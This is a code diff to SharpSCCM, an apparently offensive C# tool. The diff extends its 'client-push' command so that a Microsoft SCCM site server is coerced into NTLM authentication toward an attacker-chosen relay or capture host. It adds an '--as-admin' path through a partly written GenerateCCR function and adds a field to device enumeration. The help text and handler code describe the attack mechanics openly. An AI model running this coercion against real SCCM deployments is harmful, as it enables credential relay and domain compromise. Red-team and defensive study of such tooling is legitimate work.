@@ -58,6 +58,11 @@ namespace SharpSCCM
             GetCollectionMember(scope, collectionName, false, null, null, false, false);
         }
 
+        static void GenerateCCR(ManagementScope sccmConnection, string target)
+        {
+            Console.WriteLine($"[+] Generating a client configuration request (CCR) to coerce authentication to {target}");
+            ManagementObject newCollectionRule = new ManagementClass(sccmConnection, new ManagementPath("SMS_Collection"), null).CreateInstance();
+        }
 
         static void GetCollectionMember(ManagementScope scope, string name, bool count, string[] properties, string orderBy, bool dryRun, bool verbose)
         {
@@ -1118,7 +1123,7 @@ namespace SharpSCCM
                     }
                     if (properties.Length == 0 && !verbose)
                     {
-                        properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogonTimeStamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceNames", "SID", "SMSInstalledSites", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
+                        properties = new[] { "Active", "ADSiteName", "Client", "DistinguishedName", "FullDomainName", "HardwareID", "IPAddresses", "IPSubnets", "IPv6Addresses", "IPv6Prefixes", "IsVirtualMachine", "LastLogonTimeStamp", "LastLogonUserDomain", "LastLogonUserName", "MACAddresses", "Name", "NetbiosName", "Obsolete", "OperatingSystemNameandVersion", "PrimaryGroupID", "ResourceDomainORWorkgroup", "ResourceNames", "SID", "SMSInstalledSites", "SMSUniqueIdentifier", "SNMPCommunityName", "SystemContainerName", "SystemGroupName", "SystemOUName" };
                     }
                     ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
                     GetClassInstances(sccmConnection, "SMS_R_System", count, properties, whereCondition, orderBy, dryRun, verbose);
@@ -1163,15 +1168,25 @@ namespace SharpSCCM
             rootCommand.Add(invokeCommand);
 
             // invoke client-push
-            var invokeClientPush = new Command("client-push", "Coerce the server to authenticate to an arbitrary destination via NTLM (if enabled) by registering a new device and sending a heartbeat data discovery record (DDR) with the ClientInstalled flag set to false.");
+            var invokeClientPush = new Command("client-push", "Coerce the server to authenticate to an arbitrary destination via NTLM (if enabled) by registering a new device and sending a heartbeat data discovery record (DDR) with the ClientInstalled flag set to false. This command does not require local Administrator privileges but must be run from a client device. This command can also be run as an SCCM Administrator with the '--as-admin' option to use built-in functionality to initiate client push installation rather than registering a new client device.");
             invokeCommand.Add(invokeClientPush);
+            invokeClientPush.Add(new Option<string>(new[] { "--as-admin", "-a" }, "Use this option if you are in a user context with Administrator privileges to manage SCCM."));
             invokeClientPush.Add(new Option<string>(new[] { "--target", "-t" }, "The NetBIOS name, IP address, or if WebClient is enabled on the site server, the IP address and port (e.g., 192.168.1.1@8080) of the relay/capture server. The server will attempt to authenticate to the ADMIN$ share on this target. If left blank, NTLM authentication attempts will be sent to the machine running SharpSCCM."));
             invokeClientPush.Handler = CommandHandler.Create(
-                (string server, string sitecode, string target) =>
+                (string server, string sitecode, string asAdmin, string target) =>
                 {
-                    MessageCertificateX509 certificate = CreateUserCertificate();
-                    SmsClientId clientId = RegisterClient(certificate, target, server, sitecode);
-                    SendDDR(certificate, target, server, sitecode, clientId);
+                    if (string.IsNullOrEmpty(asAdmin))
+                    {
+                        MessageCertificateX509 certificate = CreateUserCertificate();
+                        SmsClientId clientId = RegisterClient(certificate, target, server, sitecode);
+                        SendDDR(certificate, target, server, sitecode, clientId);
+                    }
+                    else
+                    {
+                        ManagementScope sccmConnection = NewSccmConnection("\\\\" + server + "\\root\\SMS\\site_" + sitecode);
+                        GenerateCCR(sccmConnection, target);
+                    }
+
                 });
 
             // invoke query
